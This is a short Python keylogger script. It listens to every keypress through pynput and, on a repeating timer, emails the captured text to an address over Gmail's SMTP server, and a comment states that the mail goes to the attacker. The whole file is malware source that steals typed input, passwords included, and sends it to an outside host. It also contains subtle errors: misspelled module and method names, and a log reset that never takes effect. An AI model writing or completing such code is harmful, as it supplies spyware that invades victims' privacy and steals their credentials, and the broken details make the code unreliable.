#!/usr/bin/env python

import pynput.keyboard
import threading
import smptlib

# keylogger class
class Keylogger:
    
    # contructor initializes some variables 
    def __init__(self, time_interval, email, password):
        self.log = "KeyLogger Started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self,string):
        self.log = self.log + string
    
    # logs the keypresses and cleans them up a bit too
    def process_key_press(self,key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)
    
    # sends mail to the attacker
    def send_mail(self, email, password, message):
        server = smptplib.SMTP("smtp.gmail.com",587)
        server.startls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()

    # method to run the send_mail helper method
    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    # method to start the whole process out
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
